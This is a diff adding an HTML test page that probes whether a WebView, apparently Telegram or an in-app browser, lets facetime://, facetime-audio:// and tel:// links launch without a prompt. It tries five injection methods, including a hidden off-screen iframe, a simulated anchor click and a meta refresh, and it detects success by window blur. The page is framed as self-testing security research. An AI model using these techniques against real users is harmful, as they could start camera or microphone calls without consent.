@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>URL scheme probe — facetime / tel / facetime-audio</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d1117;color:#c9d1d9;padding:12px;font-size:14px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:15px;max-width:720px;margin:0 auto 12px}
+h2{font-size:16px;color:#58a6ff;margin-bottom:3px}
+.sub{font-size:11px;color:#8b949e;line-height:1.55;margin-bottom:10px}
+.verdict{border-radius:10px;padding:13px;margin:10px 0;font-weight:700;text-align:center;font-size:13px;line-height:1.5}
+.v-bad{background:#2d1214;color:#ff7b72}.v-ok{background:#0f5323;color:#7ee787}.v-wait{background:#21262d;color:#8b949e}.v-info{background:#3d2c00;color:#e3b341}
+.row{display:flex;gap:8px;font-size:12px;padding:5px 0;border-bottom:1px solid #21262d}
+.row b{min-width:200px;color:#8b949e;font-weight:500;flex-shrink:0}
+.row span{font-family:ui-monospace,monospace;word-break:break-all}
+.hot{color:#ff7b72;font-weight:700}.cool{color:#7ee787}.warn{color:#e3b341}
+button{width:100%;border:none;border-radius:8px;padding:11px;font-size:13px;font-weight:600;color:#fff;background:#1f6feb;margin-top:7px}
+button.alt{background:#30363d}button.danger{background:#c0202c}
+pre{background:#010409;border-radius:6px;padding:8px;font-size:10.5px;max-height:200px;overflow:auto;color:#8b949e;margin-top:8px;white-space:pre-wrap}
+code{background:#21262d;padding:1px 5px;border-radius:4px;font-size:.85em}
+input[type=text]{width:100%;background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:8px;color:#c9d1d9;font-size:13px;margin:4px 0}
+.warn-box{background:#2d1214;border:1px solid #f85149;border-radius:8px;padding:10px;font-size:12px;margin:8px 0;color:#ff7b72}
+</style>
+</head>
+<body>
+<div class="card">
+  <h2>URL Scheme Probe</h2>
+  <p class="sub">Tests whether this WebView context intercepts or passes through
+  <code>facetime://</code>, <code>facetime-audio://</code>, and <code>tel://</code> URL schemes.
+  <br><br><b>Context:</b> Safari intercepts these with a confirmation dialog. WKWebView delegates to the
+  host app's <code>decidePolicyForNavigationAction</code>. Apps that don't explicitly filter
+  <code>facetime://</code> let FaceTime open with camera preview — no web permission involved.
+  <br><br><b>Prior art:</b> NowSecure 2017 — LinkedIn, Twitter confirmed vulnerable. CVE-2014-7305 (Mercury Browser).
+  <br><br>Enter YOUR OWN Apple ID / phone number below (the probe calls <b>your own device</b> —
+  the test is whether FaceTime launches, not whether anyone answers).</p>
+
+  <div class="warn-box">
+    This probe opens external apps. Only run on your own device with your own Apple ID.
+    No data is sent to any server.
+  </div>
+
+  <label style="font-size:12px;color:#8b949e">Your Apple ID email or phone (for self-call):</label>
+  <input type="text" id="target" placeholder="you@icloud.com or +1234567890" value="">
+
+  <div class="verdict v-wait" id="verdict">idle — enter your Apple ID above</div>
+  <div id="env"></div>
+
+  <button onclick="probeScheme('facetime')">Test facetime:// (video call + camera preview)</button>
+  <button onclick="probeScheme('facetime-audio')">Test facetime-audio:// (audio only)</button>
+  <button class="alt" onclick="probeScheme('tel')">Test tel:// (control — should be intercepted)</button>
+
+  <h3 style="margin-top:15px;font-size:12px;color:#8b949e">Injection method:</h3>
+  <button class="alt" onclick="probeMethod('iframe')">iframe src= (most stealthy)</button>
+  <button class="alt" onclick="probeMethod('location')">location.href = (direct nav)</button>
+  <button class="alt" onclick="probeMethod('open')">window.open() (popup)</button>
+  <button class="alt" onclick="probeMethod('anchor')">anchor click (user gesture sim)</button>
+  <button class="alt" onclick="probeMethod('meta')">meta refresh (passive redirect)</button>
+
+  <pre id="log"></pre>
+</div>
+
+<div id="sandbox" style="display:none"></div>
+
+<script>
+const T0 = performance.now();
+const L = [];
+function lg(m) {
+  L.push(`[+${String(Math.round(performance.now()-T0)).padStart(5)}ms] ${m}`);
+  document.getElementById('log').textContent = L.slice(-40).join('\n');
+}
+function row(k, v, cls) {
+  const d = document.createElement('div'); d.className = 'row';
+  const b = document.createElement('b'); b.textContent = k;
+  const s = document.createElement('span'); s.textContent = String(v);
+  if (cls) s.className = cls;
+  d.appendChild(b); d.appendChild(s);
+  document.getElementById('env').appendChild(d);
+}
+
+let currentScheme = 'facetime';
+let currentMethod = 'iframe';
+
+function getTarget() {
+  const t = document.getElementById('target').value.trim();
+  if (!t) { alert('Enter your Apple ID / phone first'); return null; }
+  return t;
+}
+
+function buildURL(scheme, target) {
+  return `${scheme}://${encodeURIComponent(target)}`;
+}
+
+function probeScheme(scheme) {
+  currentScheme = scheme;
+  const t = getTarget(); if (!t) return;
+  runProbe(scheme, currentMethod, t);
+}
+
+function probeMethod(method) {
+  currentMethod = method;
+  const t = getTarget(); if (!t) return;
+  runProbe(currentScheme, method, t);
+}
+
+function runProbe(scheme, method, target) {
+  const url = buildURL(scheme, target);
+  document.getElementById('env').innerHTML = '';
+  const sandbox = document.getElementById('sandbox');
+  sandbox.innerHTML = '';
+
+  row('scheme', scheme, scheme === 'facetime' ? 'hot' : 'warn');
+  row('method', method);
+  row('url', url);
+  row('context', detectContext());
+  row('userAgent', navigator.userAgent.slice(0, 80));
+
+  lg(`probe: ${scheme}://${target} via ${method}`);
+
+  const t0 = performance.now();
+  let launched = false;
+
+  const onBlur = () => {
+    launched = true;
+    const ms = Math.round(performance.now() - t0);
+    lg(`BLUR detected at +${ms}ms — app likely launched`);
+    row('blur', `YES at +${ms}ms`, 'hot');
+    updateVerdict(scheme, method, true, ms);
+  };
+
+  window.addEventListener('blur', onBlur, {once: true});
+
+  try {
+    switch(method) {
+      case 'iframe': {
+        const f = document.createElement('iframe');
+        f.style.cssText = 'width:1px;height:1px;border:0;position:absolute;left:-9999px';
+        f.src = url;
+        sandbox.appendChild(f);
+        lg('iframe injected');
+        break;
+      }
+      case 'location': {
+        lg('setting location.href (will navigate away if not intercepted)');
+        setTimeout(() => { location.href = url; }, 100);
+        break;
+      }
+      case 'open': {
+        const w = window.open(url, '_blank');
+        lg('window.open called, result: ' + (w ? 'window ref' : 'null/blocked'));
+        if (w) row('window.open', 'returned a reference', 'warn');
+        else row('window.open', 'blocked/null', 'cool');
+        break;
+      }
+      case 'anchor': {
+        const a = document.createElement('a');
+        a.href = url;
+        a.textContent = 'auto-click';
+        a.style.cssText = 'position:absolute;left:-9999px';
+        document.body.appendChild(a);
+        a.click();
+        lg('anchor.click() fired');
+        break;
+      }
+      case 'meta': {
+        const f = document.createElement('iframe');
+        f.style.cssText = 'width:1px;height:1px;border:0;position:absolute;left:-9999px';
+        f.srcdoc = `<html><head><meta http-equiv="refresh" content="0;url=${url}"></head><body></body></html>`;
+        sandbox.appendChild(f);
+        lg('meta-refresh iframe injected');
+        break;
+      }
+    }
+  } catch(e) {
+    lg(`ERROR: ${e.name}: ${e.message}`);
+    row('error', `${e.name}: ${e.message}`, 'hot');
+  }
+
+  setTimeout(() => {
+    window.removeEventListener('blur', onBlur);
+    if (!launched) {
+      lg('no blur after 5s — scheme was likely intercepted/blocked');
+      row('blur', 'NO (5s timeout)', 'cool');
+      updateVerdict(scheme, method, false, 5000);
+    }
+  }, 5000);
+}
+
+function updateVerdict(scheme, method, launched, ms) {
+  const v = document.getElementById('verdict');
+  if (launched && scheme === 'facetime') {
+    v.className = 'verdict v-bad';
+    v.innerHTML = `FACETIME LAUNCHED via ${method} — camera preview activating<br>` +
+      `<span style="font-weight:400;font-size:12px">FaceTime opened in ${ms}ms with no web permission. ` +
+      `Camera preview is active. This context does NOT filter facetime:// navigations.</span>`;
+  } else if (launched && scheme === 'facetime-audio') {
+    v.className = 'verdict v-bad';
+    v.innerHTML = `FACETIME AUDIO LAUNCHED via ${method}<br>` +
+      `<span style="font-weight:400;font-size:12px">Audio call initiated in ${ms}ms. Microphone activates on connect.</span>`;
+  } else if (launched && scheme === 'tel') {
+    v.className = 'verdict v-info';
+    v.innerHTML = `TEL launched via ${method} (${ms}ms) — this is the control. ` +
+      `If facetime:// also launches, same root cause.`;
+  } else if (!launched) {
+    v.className = 'verdict v-ok';
+    v.innerHTML = `${scheme}:// was BLOCKED via ${method} — no external app launched (5s timeout).<br>` +
+      `<span style="font-weight:400;font-size:12px">The host intercepted this scheme in decidePolicyForNavigationAction or equivalent.</span>`;
+  }
+}
+
+function detectContext() {
+  const ua = navigator.userAgent;
+  if (/Telegram/i.test(ua)) return 'Telegram WebView';
+  if (/Safari/i.test(ua) && !/Chrome/i.test(ua) && !/CriOS/i.test(ua)) {
+    if (window.webkit && window.webkit.messageHandlers) return 'WKWebView (native app)';
+    return 'Safari';
+  }
+  if (/Chrome/i.test(ua)) return 'Chrome';
+  return 'Unknown';
+}
+
+row('context', detectContext());
+row('platform', navigator.platform || 'unknown');
+row('standalone', window.navigator.standalone ? 'YES' : 'no');
+if (window.Telegram && window.Telegram.WebApp) {
+  row('Telegram.WebApp', 'present', 'hot');
+  row('Telegram.WebApp.platform', window.Telegram.WebApp.platform || '?');
+}
+lg('ready — enter your Apple ID and select a test');
+</script>
+</body>
+</html>
